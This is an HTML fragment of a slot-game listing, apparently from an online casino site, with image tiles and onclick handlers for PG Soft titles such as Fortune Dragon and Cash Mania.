                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/943ea34742cefba5aa67d4e72264b6b9.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ganesha Fortune">Ganesha Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dreams of Macau" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dreams of Macau', '/assets/games/i/165x220/pgshoft/13519d43b2de5424614ac1e5e37b5ef5.webp?v=0.1' , '79', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/13519d43b2de5424614ac1e5e37b5ef5.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dreams of Macau">Dreams of Macau</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Yakuza Honor" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Yakuza Honor', '/assets/games/i/165x220/pgshoft/66b05e281a6226dcef3ec7f725fdcc38.webp?v=0.1' , '1760238', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/66b05e281a6226dcef3ec7f725fdcc38.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Yakuza Honor">Yakuza Honor</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Dragon" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Dragon', '/assets/games/i/165x220/pgshoft/2d9955268b1034226ab09ed77ef67fc6.webp?v=0.1' , '1695365', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/2d9955268b1034226ab09ed77ef67fc6.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Dragon">Fortune Dragon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Midas Fortune" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Midas Fortune', '/assets/games/i/165x220/pgshoft/8a81783c05302740103da4ebf3102535.webp?v=0.1' , '1402846', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/8a81783c05302740103da4ebf3102535.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Midas Fortune">Midas Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Grimms&amp;quot;amp; Bounty: Hansel &amp;quot; Gretel" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Grimms&amp;quot;amp; Bounty: Hansel &amp;quot; Gretel', '/assets/games/i/165x220/pgshoft/67ccd7a77716fa0fca4dad9b73957ef2.webp?v=0.1' , '1903012', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/67ccd7a77716fa0fca4dad9b73957ef2.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Grimms' Bounty: Hansel &amp; Gretel">Grimms' Bounty: Hansel &amp; Gretel</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Asgardian Rising" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Asgardian Rising', '/assets/games/i/165x220/pgshoft/790cc9c534f7c708c4976476fbbf3cc9.webp?v=0.1' , '1340277', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/790cc9c534f7c708c4976476fbbf3cc9.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Asgardian Rising">Asgardian Rising</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Garuda Gems" data-filter="ALL,NEW,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Garuda Gems', '/assets/games/i/165x220/pgshoft/3fc30b8e9006a88ef25062cfa4f62cf4.webp?v=0.1' , '122', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/3fc30b8e9006a88ef25062cfa4f62cf4.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Garuda Gems">Garuda Gems</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Horse" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Horse', '/assets/games/i/165x220/pgshoft/37f4b9bc13e2fab867986ffaa21149ce.webp?v=0.1' , '2100928', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/37f4b9bc13e2fab867986ffaa21149ce.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Horse">Fortune Horse</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Forbidden Alchemy" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Forbidden Alchemy', '/assets/games/i/165x220/pgshoft/a9fc669efd502fc4a04c217545d65920.webp?v=0.1' , '1981965', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/a9fc669efd502fc4a04c217545d65920.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Forbidden Alchemy">Forbidden Alchemy</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mythical Guardians" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mythical Guardians', '/assets/games/i/165x220/pgshoft/64a99c02d51bf00886eaf49e6848d668.webp?v=0.1' , '1849515', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/64a99c02d51bf00886eaf49e6848d668.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mythical Guardians">Mythical Guardians</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Poker Kingdom Win" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Poker Kingdom Win', '/assets/games/i/165x220/pgshoft/1fedde8aa6937d159976d7c300ed2fa9.webp?v=0.1' , '2009635', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/1fedde8aa6937d159976d7c300ed2fa9.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Poker Kingdom Win">Poker Kingdom Win</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Alibaba&amp;quot;amp;s Cave of Fortune" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Alibaba&amp;quot;amp;s Cave of Fortune', '/assets/games/i/165x220/pgshoft/8f26ecfc5ec8ffc5fe4f405681e264df.webp?v=0.1' , '1940257', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/8f26ecfc5ec8ffc5fe4f405681e264df.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Alibaba's Cave of Fortune">Alibaba's Cave of Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Skylight Wonders" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Skylight Wonders', '/assets/games/i/165x220/pgshoft/e9e0f56bb5e968c3961850f357046948.webp?v=0.1' , '2012025', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/e9e0f56bb5e968c3961850f357046948.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Skylight Wonders">Skylight Wonders</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pharaoh Royals" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pharaoh Royals', '/assets/games/i/165x220/pgshoft/6b2285f7b8abdee469c6123cf0b5fab6.webp?v=0.1' , '1964781', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/6b2285f7b8abdee469c6123cf0b5fab6.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pharaoh Royals">Pharaoh Royals</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Kraken Gold Rush" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Kraken Gold Rush', '/assets/games/i/165x220/pgshoft/bb06b7d428dcbc7ca4ede68d01583d2b.webp?v=0.1' , '1929177', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/bb06b7d428dcbc7ca4ede68d01583d2b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Kraken Gold Rush">Kraken Gold Rush</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Galaxy Miner" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Galaxy Miner', '/assets/games/i/165x220/pgshoft/99f4120e67d8a02d69dbedc4b885097c.webp?v=0.1' , '1918451', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/99f4120e67d8a02d69dbedc4b885097c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Galaxy Miner">Galaxy Miner</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon&amp;quot;amp;s Treasure Quest" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon&amp;quot;amp;s Treasure Quest', '/assets/games/i/165x220/pgshoft/97daa0b23a20d3b841271c755c4c6cef.webp?v=0.1' , '1897678', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/97daa0b23a20d3b841271c755c4c6cef.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon's Treasure Quest">Dragon's Treasure Quest</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Diner Frenzy Spins" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Diner Frenzy Spins', '/assets/games/i/165x220/pgshoft/88e2557e0392e10310c743d276c486f5.webp?v=0.1' , '1935269', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/88e2557e0392e10310c743d276c486f5.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Diner Frenzy Spins">Diner Frenzy Spins</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jack the Giant Hunter" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jack the Giant Hunter', '/assets/games/i/165x220/pgshoft/4f50bc1ddbf5a19578b597e54c6fed63.webp?v=0.1' , '1834850', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/4f50bc1ddbf5a19578b597e54c6fed63.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jack the Giant Hunter">Jack the Giant Hunter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dead Man&amp;quot;amp;s Riches" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dead Man&amp;quot;amp;s Riches', '/assets/games/i/165x220/pgshoft/772c77c7b985735deac2e17b2915b94a.webp?v=0.1' , '1865521', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/772c77c7b985735deac2e17b2915b94a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dead Man's Riches">Dead Man's Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Knockout Riches" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Knockout Riches', '/assets/games/i/165x220/pgshoft/d5255b5f2bc4cee0b54857127f5738bd.webp?v=0.1' , '1881268', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/d5255b5f2bc4cee0b54857127f5738bd.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Knockout Riches">Knockout Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Doomsday Rampage" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Doomsday Rampage', '/assets/games/i/165x220/pgshoft/fce0f111d0221efbfcaf16cf9fdd2d0f.webp?v=0.1' , '1827457', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/fce0f111d0221efbfcaf16cf9fdd2d0f.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Doomsday Rampage">Doomsday Rampage</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Graffiti Rush" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Graffiti Rush', '/assets/games/i/165x220/pgshoft/e5f8c79caf2fc5b855906ff1903ff4ba.webp?v=0.1' , '1804577', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/e5f8c79caf2fc5b855906ff1903ff4ba.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Graffiti Rush">Graffiti Rush</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Incan Wonders" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Incan Wonders', '/assets/games/i/165x220/pgshoft/16db8443e75be32cd3d55228c06bbaf2.webp?v=0.1' , '1850016', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/16db8443e75be32cd3d55228c06bbaf2.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Incan Wonders">Incan Wonders</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Snake" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Snake', '/assets/games/i/165x220/pgshoft/8be633c6389748a14c5521ebbc7930e7.webp?v=0.1' , '1879752', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/8be633c6389748a14c5521ebbc7930e7.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Snake">Fortune Snake</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Chocolate Deluxe" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Chocolate Deluxe', '/assets/games/i/165x220/pgshoft/c408665c94d5d3ca6ef6d094a82ffdc0.webp?v=0.1' , '1666445', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/c408665c94d5d3ca6ef6d094a82ffdc0.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Chocolate Deluxe">Chocolate Deluxe</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rio Fantasia" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rio Fantasia', '/assets/games/i/165x220/pgshoft/622ce74af58d0d2c74bad3d9a72f7917.webp?v=0.1' , '1786529', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/622ce74af58d0d2c74bad3d9a72f7917.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rio Fantasia">Rio Fantasia</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Museum Wonders" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Museum Wonders', '/assets/games/i/165x220/pgshoft/ec10577a3104a8c26bd74ba92fe1d389.webp?v=0.2' , '1755623', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/ec10577a3104a8c26bd74ba92fe1d389.webp?v=0.2" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Museum Wonders">Museum Wonders</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Oishi Delights" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Oishi Delights', '/assets/games/i/165x220/pgshoft/cf930ba7c985bc51ccc349f1aca877d4.webp?v=0.1' , '1815268', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/cf930ba7c985bc51ccc349f1aca877d4.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Oishi Delights">Oishi Delights</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Three Crazy Piggies" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Three Crazy Piggies', '/assets/games/i/165x220/pgshoft/5f1c0d8cde228ed9fccb297262853fa8.webp?v=0.1' , '1727711', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/5f1c0d8cde228ed9fccb297262853fa8.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Three Crazy Piggies">Three Crazy Piggies</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wings of Iguazu" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wings of Iguazu', '/assets/games/i/165x220/pgshoft/53ea9d1ce5ce704187b08518ae5842cd.webp?v=0.1' , '1747549', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/53ea9d1ce5ce704187b08518ae5842cd.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wings of Iguazu">Wings of Iguazu</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Shark Bounty" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Shark Bounty', '/assets/games/i/165x220/pgshoft/11ff1e9919d93f89abcaa40a8b356240.webp?v=0.2' , '1648578', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/11ff1e9919d93f89abcaa40a8b356240.webp?v=0.2" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Shark Bounty">Shark Bounty</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Futebol Fever" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Futebol Fever', '/assets/games/i/165x220/pgshoft/43c05b4728e46f8609959f8505cfb044.webp?v=0.1' , '1778752', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/43c05b4728e46f8609959f8505cfb044.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Futebol Fever">Futebol Fever</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Zombie Outbreak" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Zombie Outbreak', '/assets/games/i/165x220/pgshoft/634fdaec9b774ac837df498261996faa.webp?v=0.1' , '1635221', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/634fdaec9b774ac837df498261996faa.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Zombie Outbreak">Zombie Outbreak</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mystic Potion" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mystic Potion', '/assets/games/i/165x220/pgshoft/123ec5264f81d9345c5d1114a9bc2e9b.webp?v=1' , '1717688', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/123ec5264f81d9345c5d1114a9bc2e9b.webp?v=1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mystic Potion">Mystic Potion</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cash Mania" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cash Mania', '/assets/games/i/165x220/pgshoft/156b9f3934aef2b8e6fea1c8f0b5d594.webp?v=0.1' , '1682240', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/156b9f3934aef2b8e6fea1c8f0b5d594.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cash Mania">Cash Mania</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Werewolf&amp;quot;amp;s Hunt" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Werewolf&amp;quot;amp;s Hunt', '/assets/games/i/165x220/pgshoft/db1c4f42d0459beae863e0407a1be641.webp?v=0.1' , '1615454', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/db1c4f42d0459beae863e0407a1be641.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Werewolf's Hunt">Werewolf's Hunt</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Tsar Treasures" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Tsar Treasures', '/assets/games/i/165x220/pgshoft/53cd5c4e6c55587958160ee497112c32.webp?v=0.1' , '1655268', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/53cd5c4e6c55587958160ee497112c32.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Tsar Treasures">Tsar Treasures</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Heist Cashout" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Heist Cashout', '/assets/games/i/165x220/pgshoft/293b54eea100ce20b9f3f3d887aa2db0.webp?v=0.1' , '1568554', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/293b54eea100ce20b9f3f3d887aa2db0.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Heist Cashout">Wild Heist Cashout</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Forge of Wealth" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Forge of Wealth', '/assets/games/i/165x220/pgshoft/ca4afa753c10605e06219cc2caead475.webp?v=0.1' , '1555350', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/ca4afa753c10605e06219cc2caead475.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Forge of Wealth">Forge of Wealth</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ultimate Striker" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ultimate Striker', '/assets/games/i/165x220/pgshoft/e7c6b2356d244579e736c3949f7419a8.webp?v=0.1' , '1489936', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/e7c6b2356d244579e736c3949f7419a8.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ultimate Striker">Ultimate Striker</h5>
        </a>
        
     
